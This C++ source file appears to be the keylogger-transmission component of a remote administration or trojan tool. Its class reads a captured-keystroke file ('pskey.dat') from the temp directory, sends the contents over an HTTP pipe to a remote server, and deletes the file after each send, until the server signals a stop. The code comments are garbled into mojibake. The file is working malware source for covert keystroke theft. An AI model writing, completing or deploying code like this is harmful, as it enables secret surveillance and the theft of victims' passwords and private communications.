// MyKeyMonTrans.cpp: implementation of the CMyKeyMonTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "MyKeyMonTrans.h"
#include <sys/stat.h>

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyKeyMonTrans::CMyKeyMonTrans()
{
	hExitEvent = CreateEvent(NULL,TRUE,FALSE,NULL);
}

CMyKeyMonTrans::~CMyKeyMonTrans()
{
	CloseHandle(hExitEvent);
}

//�����߳�
BOOL CMyKeyMonTrans::StartWork(char* m_ServerAddr, int m_ServerPort, 
							  int nSend, int nRecv)
{
	//����Ŀ�������,�������ͽ��չܵ�
	if(!CMyHttpPipeBase::StartWork(
		m_ServerAddr, m_ServerPort, nSend, nRecv)) 
		return FALSE;

	//����״̬����߳�
	_beginthread(RecvThread,0,this);

	//��ʼ��������
	char m_CharFileName[256] = {0};
	GetTempPath(200,m_CharFileName);
	strcat(m_CharFileName,"pskey.dat");
	BOOL bRet = TRUE;

	//������
	HANDLE hMetux = CreateMutex(NULL, FALSE, "PsKey400");
	if(hMetux == NULL) return FALSE;

	while(WaitForSingleObject(hExitEvent,0) 
		== WAIT_TIMEOUT && bRet)
	{
		struct _stat st = {0};
		if(_stat(m_CharFileName , &st) == 0)
		{
			char* pData = new char[st.st_size];
			FILE *fp = fopen(m_CharFileName , "rb");
			if(fp != NULL)
			{
				fread(pData,st.st_size,1,fp);
				fclose(fp);
				bRet = SendData(pData,st.st_size);
				delete [] pData;
				if(bRet)
				{
					WaitForSingleObject(hMetux, INFINITE);
					DeleteFile(m_CharFileName);
					ReleaseMutex(hMetux);
				}
			}
		}
		Sleep(200);
	}
	CloseHandle(hMetux);

	//�رվ��
	StopWork();
	return TRUE;
}

void CMyKeyMonTrans::ProcessCmd()
{
	char ch = 0;
	RecvData(&ch,1);

	//��ֹ����
	SetEvent(hExitEvent);
}

void CMyKeyMonTrans::RecvThread(LPVOID lPvoid)
{
	CMyKeyMonTrans* pThis = (CMyKeyMonTrans*) lPvoid;
	pThis->ProcessCmd();
}